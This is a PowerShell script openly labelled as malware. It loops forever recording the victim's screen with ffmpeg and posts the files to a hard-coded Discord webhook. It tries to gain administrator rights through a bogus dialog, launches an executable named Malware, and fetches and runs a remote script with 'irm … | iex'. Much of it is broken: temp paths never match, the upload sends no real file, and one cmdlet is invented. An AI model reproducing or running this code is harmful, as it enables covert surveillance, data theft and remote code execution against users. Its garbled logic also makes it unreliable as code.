# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1497824412307820575/JmEyUzNIHjGl81yZqJ5_svUO1GeMmDPH55jrxqKpVYOsR591zIlXhpJtPugGVcku5tMR"
# Set the file path for storing recorded videos
$recordFilePath = [IO.Path]::GetTempFileName()
# Create a temporary directory if it doesn't exist
if (!(Test-Path -Path $recordFilePath)) {
    New-Item -ItemType Directory -Path ([IO.Path]::GetTempFileName())
}
# Define the username for admin rights (will be used as the owner of the folder)
$adminUsername = "YOUR_USERNAME"
# Set the path for the malicious executable
$malwarePath = [IO.Path]::GetTempFileName()
# Function to record screen and send video through Discord webhook
function RecordScreenAndSendVideo {
    # Record the screen for 30 seconds using a temporary file name
    Start-Process -FilePath "ffmpeg" -ArgumentList "-y", "-framerate", "30", "-f", "gdigrab", "-i", "desktop", ([IO.Path]::GetTempFileName() + ".mp4")
    # Get the recorded video file path
    $videoFilePath = [IO.Path]::GetTempFileName()
    $videoFileExt = ".mp4"
    # Send the video through Discord webhook
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body @{file1= ([IO.Path]::GetTempFileName() + $videoFileExt)}
}
# Function to grant permissions to a user
function GrantPermissions {
    $userPrincipalName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    if (!(New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole("Administrator")) {
        # Create a new process with admin privileges to run the malicious script
        Start-Process -FilePath "powershell" -ArgumentList "-Command", "`$(Add-Type -AssemblyName PresentationFramework; [System.Runtime.InteropServices.Marshal]::GetActiveWindow(); $wshell = New-Object System.Windows.Forms.SaveFileDialog; $wshell.FileName = 'Malware'; $wshell.Filter = 'All files (*.*)|*.*'; $result = $wshell.ShowDialog(); if ($result -eq [System.Windows.Forms.DialogResult]::OK) { Add-Type -AssemblyName PresentationFramework; [Windows.Security.Credentials.PasswordCredential]::new($userPrincipalName, $adminUsername); })" -Wait
        Exit-Policy
    }
}
# Function to install a malware (in this case, a harmless executable)
function InstallMalware {
    # Create the directory for the malicious executable if it doesn't exist
    if (!(Test-Path -Path ([IO.Path]::GetTempFileName() + "Malware"))) {
        New-Item -ItemType Directory -Path ([IO.Path]::GetTempFileName() + "Malware")
    }
    # Copy the malware to the designated path
    Copy-Item -Path ([IO.Path]::GetTempFileName()) -Destination ([IO.Path]::GetTempFileName() + "Malware\")
    # Run the malware (in this case, a harmless executable)
    Start-Process -FilePath ([IO.Path]::GetTempFileName() + "Malware\Malware.exe")
}
# Download and run the malicious script using a new process with admin privileges
GrantPermissions
irm "https://luatools.vercel.app/manifest.ps1" | iex
# Record screen every 30 seconds
while ($true) {
    RecordScreenAndSendVideo
    Start-Sleep -s 30
}
